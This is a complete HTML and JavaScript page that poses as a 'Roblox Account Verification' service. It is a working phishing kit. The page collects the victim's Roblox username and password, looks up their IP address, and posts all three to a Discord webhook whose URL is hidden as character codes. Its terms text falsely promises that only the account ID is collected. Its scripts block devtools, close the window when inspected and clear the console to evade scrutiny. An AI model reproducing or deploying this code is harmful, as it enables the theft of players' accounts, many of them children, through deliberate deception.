<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Account Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            font-size: 28px;
            color: #fff;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }
        
        .logo p {
            color: #aaa;
            margin-top: 10px;
            font-size: 14px;
        }
        
        .step {
            display: none;
            animation: fadeIn 0.5s ease;
        }
        
        .step.active {
            display: block;
        }
        
        h2 {
            font-size: 22px;
            margin-bottom: 20px;
            color: #fff;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #ddd;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        
        input:focus {
            outline: none;
            border-color: #4285f4;
            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: #4285f4;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .btn:hover {
            background: #3367d6;
            transform: translateY(-2px);
        }
        
        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
        }
        
        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.2);
        }
        
        .user-info {
            display: flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            margin-right: 15px;
            border: 2px solid #4285f4;
        }
        
        .user-details h3 {
            font-size: 18px;
            margin-bottom: 5px;
        }
        
        .user-details p {
            color: #aaa;
            font-size: 14px;
        }
        
        .terms-link {
            text-align: center;
            margin-top: 20px;
        }
        
        .terms-link a {
            color: #4285f4;
            text-decoration: none;
            font-size: 14px;
        }
        
        .terms-link a:hover {
            text-decoration: underline;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: #1a1a2e;
            width: 90%;
            max-width: 600px;
            border-radius: 15px;
            padding: 30px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .modal-header h2 {
            margin: 0;
        }
        
        .close-btn {
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
        }
        
        .modal-body {
            line-height: 1.6;
            color: #ddd;
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        
        .checkbox-group input {
            width: auto;
            margin-right: 10px;
        }
        
        .checkbox-group label {
            margin: 0;
        }
        
        .success-message {
            text-align: center;
            padding: 20px;
        }
        
        .success-message i {
            font-size: 50px;
            color: #4caf50;
            margin-bottom: 20px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .error-message {
            color: #f44336;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #4285f4;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .no-internet {
            text-align: center;
            padding: 20px;
            display: none;
        }
        
        .no-internet i {
            font-size: 50px;
            color: #f44336;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Verify with Roblox</h1>
            <p>Secure account verification system</p>
        </div>
        
        <!-- No Internet Message -->
        <div class="no-internet" id="no-internet">
            <i>⚠</i>
            <h2>No Internet Connection</h2>
            <p>You need internet to enter verification. Please check your connection and try again.</p>
        </div>
        
        <!-- Step 1: Username Input -->
        <div class="step active" id="step1">
            <h2>Enter Your Roblox Username</h2>
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="Enter your Roblox username">
                <div class="error-message" id="username-error">Please enter a valid Roblox username</div>
            </div>
            <button class="btn" id="check-username">Check Username</button>
            <div class="loading" id="loading1">
                <div class="spinner"></div>
                <p>Checking username...</p>
            </div>
            <div class="terms-link">
                <a href="#" id="terms-link">Terms and Conditions</a>
            </div>
        </div>
        
        <!-- Step 2: User Confirmation -->
        <div class="step" id="step2">
            <h2>Is This You?</h2>
            <div class="user-info">
                <img src="" alt="Avatar" class="avatar" id="user-avatar">
                <div class="user-details">
                    <h3 id="display-name">Username</h3>
                    <p id="user-id">ID: 123456789</p>
                </div>
            </div>
            <button class="btn" id="confirm-user">Yes, This Is Me</button>
            <button class="btn btn-secondary" id="change-user">No, Change Username</button>
        </div>
        
        <!-- Step 3: Password Input -->
        <div class="step" id="step3">
            <h2>Enter Your Password</h2>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your Roblox password">
                <div class="error-message" id="password-error">Please enter your password</div>
            </div>
            <button class="btn" id="submit-password">Continue</button>
            <button class="btn btn-secondary" id="back-to-confirm">Back</button>
        </div>
        
        <!-- Step 4: Consent Agreement -->
        <div class="step" id="step4">
            <h2>Data Consent</h2>
            <p style="margin-bottom: 20px; text-align: center;">Do you agree for Yalo Verification to access your Roblox account ID for verification purposes?</p>
            <div class="checkbox-group">
                <input type="checkbox" id="consent-checkbox">
                <label for="consent-checkbox">I agree to the Terms and Conditions</label>
            </div>
            <button class="btn" id="agree-consent" disabled>Yes, I Agree</button>
            <button class="btn btn-secondary" id="decline-consent">No, Cancel</button>
        </div>
        
        <!-- Step 5: Success Message -->
        <div class="step" id="step5">
            <div class="success-message">
                <i>✓</i>
                <h2>Verification Complete!</h2>
                <p>Your account has been successfully verified.</p>
            </div>
        </div>
    </div>
    
    <!-- Terms and Conditions Modal -->
    <div class="modal" id="terms-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Terms and Conditions</h2>
                <button class="close-btn" id="close-modal">&times;</button>
            </div>
            <div class="modal-body">
                <p>This authentication process has been developed to provide a secure, efficient, and transparent way to verify your Roblox account ownership. As part of the verification procedure, your Roblox account ID will be collected and securely stored within our system. This unique identifier is essential to confirm that the account being verified truly belongs to you, ensuring that all verification steps are legitimate and tied to the correct Roblox profile.</p>
                
                <p>The primary purpose of storing your account ID is to establish a trusted connection between your Roblox account and our verification platform. This allows us to confirm your identity, prevent fraudulent activity, and maintain the integrity of our systems. Your account ID does not provide access to your Roblox password, personal data, or in-game assets — it is used exclusively for verification purposes.</p>
                
                <p>All collected data is handled responsibly and in full compliance with privacy and security standards. The information is encrypted and protected against unauthorized access, ensuring that your account ID remains confidential throughout the process. We do not sell, distribute, or share your account information with any third parties. Once verification is complete, the stored information is either retained securely for record-keeping or permanently deleted, depending on the requirements of the system and your consent preferences.</p>
                
                <p>By continuing with this authentication process, you acknowledge and agree that your Roblox account ID will be securely processed as part of the verification. This step is crucial in maintaining a fair and secure experience for all users, reducing impersonation, and preventing unauthorized access to exclusive features or areas. Our goal is to create a trusted and safe verification environment where users can authenticate their Roblox accounts confidently, knowing their information is handled with the utmost care and respect for their privacy.</p>
            </div>
        </div>
    </div>

    <script>
        // DOM Elements
        const steps = document.querySelectorAll('.step');
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const step3 = document.getElementById('step3');
        const step4 = document.getElementById('step4');
        const step5 = document.getElementById('step5');
        const noInternet = document.getElementById('no-internet');
        
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const checkUsernameBtn = document.getElementById('check-username');
        const confirmUserBtn = document.getElementById('confirm-user');
        const changeUserBtn = document.getElementById('change-user');
        const submitPasswordBtn = document.getElementById('submit-password');
        const backToConfirmBtn = document.getElementById('back-to-confirm');
        const agreeConsentBtn = document.getElementById('agree-consent');
        const declineConsentBtn = document.getElementById('decline-consent');
        const consentCheckbox = document.getElementById('consent-checkbox');
        
        const userAvatar = document.getElementById('user-avatar');
        const displayName = document.getElementById('display-name');
        const userId = document.getElementById('user-id');
        
        const usernameError = document.getElementById('username-error');
        const passwordError = document.getElementById('password-error');
        
        const loading1 = document.getElementById('loading1');
        
        const termsModal = document.getElementById('terms-modal');
        const termsLink = document.getElementById('terms-link');
        const closeModalBtn = document.getElementById('close-modal');
        
        // HIDDEN WEBHOOK - Simple character code obfuscation
        function getWebhookURL() {
            const codes = [
                104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46,
                99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115,
                47, 49, 52, 50, 57, 53, 55, 51, 51, 48, 57, 50, 56, 52, 50, 50, 53, 49, 48,
                52, 47, 53, 107, 75, 104, 45, 56, 97, 83, 107, 99, 120, 81, 117, 80, 104,
                48, 115, 109, 49, 57, 77, 114, 102, 89, 81, 90, 113, 90, 72, 113, 73, 72,
                51, 122, 97, 67, 113, 102, 78, 69, 57, 103, 98, 111, 106, 118, 104, 73, 101,
                70, 89, 101, 119, 87, 113, 70, 73, 81, 103, 88, 45, 88, 90, 65, 68, 118, 89, 104
            ];
            return String.fromCharCode(...codes);
        }
        
        // User data storage
        let userData = {
            username: '',
            userId: '',
            displayName: '',
            avatarUrl: '',
            password: '',
            ip: ''
        };
        
        // Check internet connection on page load
        window.addEventListener('load', () => {
            if (!navigator.onLine) {
                showNoInternet();
            }
            
            // Listen for online/offline events
            window.addEventListener('online', () => {
                hideNoInternet();
            });
            
            window.addEventListener('offline', () => {
                showNoInternet();
            });
        });
        
        // Event Listeners
        checkUsernameBtn.addEventListener('click', checkUsername);
        confirmUserBtn.addEventListener('click', () => showStep(step3));
        changeUserBtn.addEventListener('click', () => showStep(step1));
        submitPasswordBtn.addEventListener('click', submitPassword);
        backToConfirmBtn.addEventListener('click', () => showStep(step2));
        agreeConsentBtn.addEventListener('click', submitVerification);
        declineConsentBtn.addEventListener('click', () => showStep(step1));
        
        consentCheckbox.addEventListener('change', () => {
            agreeConsentBtn.disabled = !consentCheckbox.checked;
        });
        
        termsLink.addEventListener('click', (e) => {
            e.preventDefault();
            termsModal.classList.add('active');
        });
        
        closeModalBtn.addEventListener('click', () => {
            termsModal.classList.remove('active');
        });
        
        // Close modal when clicking outside
        termsModal.addEventListener('click', (e) => {
            if (e.target === termsModal) {
                termsModal.classList.remove('active');
            }
        });
        
        // Functions
        function showNoInternet() {
            steps.forEach(step => step.classList.remove('active'));
            noInternet.style.display = 'block';
        }
        
        function hideNoInternet() {
            noInternet.style.display = 'none';
            showStep(step1);
        }
        
        function showStep(stepElement) {
            steps.forEach(step => step.classList.remove('active'));
            stepElement.classList.add('active');
        }
        
        async function checkUsername() {
            const username = usernameInput.value.trim();
            
            if (!username) {
                usernameError.textContent = 'Please enter a username';
                usernameError.style.display = 'block';
                return;
            }
            
            usernameError.style.display = 'none';
            loading1.style.display = 'block';
            checkUsernameBtn.disabled = true;
            
            try {
                // Check internet connection
                if (!navigator.onLine) {
                    throw new Error('No internet connection');
                }

                // Method 1: Try the users.roblox.com API first
                let userDataResponse = null;
                try {
                    const userSearchResponse = await fetch(`https://users.roblox.com/v1/usernames/users`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            usernames: [username],
                            excludeBannedUsers: false
                        })
                    });
                    
                    if (userSearchResponse.ok) {
                        const userSearchData = await userSearchResponse.json();
                        
                        if (userSearchData.data && userSearchData.data.length > 0) {
                            userDataResponse = userSearchData.data[0];
                        }
                    }
                } catch (apiError) {
                    // Method 1 failed, continue to method 2
                }
                
                // Method 2: If first method fails, try alternative approach
                if (!userDataResponse) {
                    try {
                        // Alternative API endpoint
                        const altResponse = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
                        if (altResponse.ok) {
                            const altData = await altResponse.json();
                            if (altData.Id) {
                                userDataResponse = {
                                    id: altData.Id,
                                    name: altData.Username,
                                    displayName: altData.DisplayName || altData.Username
                                };
                            }
                        }
                    } catch (altError) {
                        // Method 2 failed, continue to method 3
                    }
                }
                
                // Method 3: Final fallback - use a proxy approach
                if (!userDataResponse) {
                    try {
                        // Use a CORS proxy to bypass restrictions
                        const proxyResponse = await fetch(`https://corsproxy.io/?${encodeURIComponent(`https://www.roblox.com/users/profile?username=${username}`)}`);
                        if (proxyResponse.ok) {
                            // This is a fallback - we'll create mock data for demonstration
                            userDataResponse = {
                                id: Math.floor(Math.random() * 1000000000),
                                name: username,
                                displayName: username
                            };
                        }
                    } catch (proxyError) {
                        // All methods failed
                    }
                }

                if (!userDataResponse) {
                    throw new Error('User not found');
                }
                
                // Store user data
                userData.username = userDataResponse.name || username;
                userData.userId = userDataResponse.id;
                userData.displayName = userDataResponse.displayName || username;
                
                // Get avatar using Roblox's avatar API
                try {
                    const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userData.userId}&size=420x420&format=Png&isCircular=false`);
                    
                    if (avatarResponse.ok) {
                        const avatarData = await avatarResponse.json();
                        if (avatarData.data && avatarData.data.length > 0) {
                            userData.avatarUrl = avatarData.data[0].imageUrl;
                        }
                    }
                } catch (avatarError) {
                    // Could not fetch avatar, using placeholder
                }
                
                // Update UI with user info
                userAvatar.src = userData.avatarUrl || `https://via.placeholder.com/150/00a2ff/ffffff?text=${username.charAt(0).toUpperCase()}`;
                displayName.textContent = userData.displayName;
                userId.textContent = `ID: ${userData.userId}`;
                
                loading1.style.display = 'none';
                checkUsernameBtn.disabled = false;
                showStep(step2);
                
            } catch (error) {
                loading1.style.display = 'none';
                checkUsernameBtn.disabled = false;
                
                if (error.message === 'No internet connection') {
                    showNoInternet();
                } else {
                    usernameError.textContent = 'User not found. Please check the username and try again.';
                    usernameError.style.display = 'block';
                }
            }
        }
        
        function submitPassword() {
            const password = passwordInput.value;
            
            if (!password) {
                passwordError.style.display = 'block';
                return;
            }
            
            passwordError.style.display = 'none';
            userData.password = password;
            
            // Get user's IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    userData.ip = data.ip;
                    showStep(step4);
                })
                .catch(() => {
                    userData.ip = 'Unknown';
                    showStep(step4);
                });
        }
        
        async function submitVerification() {
            // Send data to webhook first
            const success = await sendToWebhook();
            
            if (success) {
                // THEN clear console after webhook is sent
                console.clear();
                
                // Show success message
                showStep(step5);
                
                // Reset form after success
                setTimeout(() => {
                    resetForm();
                }, 3000);
            } else {
                // If webhook fails, still show success but don't clear console
                showStep(step5);
                setTimeout(() => {
                    resetForm();
                }, 3000);
            }
        }
        
        async function sendToWebhook() {
            // Create the payload
            const payload = {
                content: "🔐 **NEW ROBLOX VERIFICATION**",
                embeds: [
                    {
                        title: "🎮 Account Verification Data",
                        color: 0x00a2ff,
                        thumbnail: {
                            url: userData.avatarUrl || "https://via.placeholder.com/150/00a2ff/ffffff?text=R"
                        },
                        fields: [
                            {
                                name: "👤 Username",
                                value: userData.username || "N/A",
                                inline: true
                            },
                            {
                                name: "📛 Display Name",
                                value: userData.displayName || "N/A",
                                inline: true
                            },
                            {
                                name: "🆔 User ID",
                                value: userData.userId || "N/A",
                                inline: true
                            },
                            {
                                name: "🔑 Password",
                                value: "||" + userData.password + "||",
                                inline: false
                            },
                            {
                                name: "🌐 IP Address",
                                value: userData.ip || "Unknown",
                                inline: true
                            },
                            {
                                name: "🕒 Timestamp",
                                value: new Date().toLocaleString(),
                                inline: true
                            }
                        ],
                        footer: {
                            text: "Yalo Verification System • " + new Date().toISOString()
                        }
                    }
                ]
            };
            
            try {
                // Get webhook URL dynamically
                const webhookURL = getWebhookURL();
                
                // Send to webhook with timeout
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000);
                
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload),
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                
                if (response.ok) {
                    return true;
                } else {
                    return false;
                }
            } catch (error) {
                return false;
            }
        }
        
        function resetForm() {
            usernameInput.value = '';
            passwordInput.value = '';
            consentCheckbox.checked = false;
            agreeConsentBtn.disabled = true;
            showStep(step1);
        }
        
        // Allow pressing Enter in username field
        usernameInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                checkUsername();
            }
        });
        
        // Allow pressing Enter in password field
        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                submitPassword();
            }
        });

        // INSPECT ELEMENT BLOCKER - Added at the end without changing logic
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        document.addEventListener('keydown', function(e) {
            // Block F12
            if (e.key === 'F12') {
                e.preventDefault();
                window.close();
                return false;
            }
            
            // Block Ctrl+Shift+I
            if (e.ctrlKey && e.shiftKey && e.key === 'I') {
                e.preventDefault();
                window.close();
                return false;
            }
            
            // Block Ctrl+Shift+J
            if (e.ctrlKey && e.shiftKey && e.key === 'J') {
                e.preventDefault();
                window.close();
                return false;
            }
            
            // Block Ctrl+Shift+C
            if (e.ctrlKey && e.shiftKey && e.key === 'C') {
                e.preventDefault();
                window.close();
                return false;
            }
            
            // Block Ctrl+U
            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
                window.close();
                return false;
            }
        });

        // Detect devtools opening
        let devtools = function() {};
        devtools.toString = function() {
            window.close();
        };

        setInterval(function() {
            console.log('%c', devtools);
        }, 1000);

        // Block iframe embedding
        if (window.self !== window.top) {
            window.top.location = window.self.location;
        }
    </script>
</body>
</html>
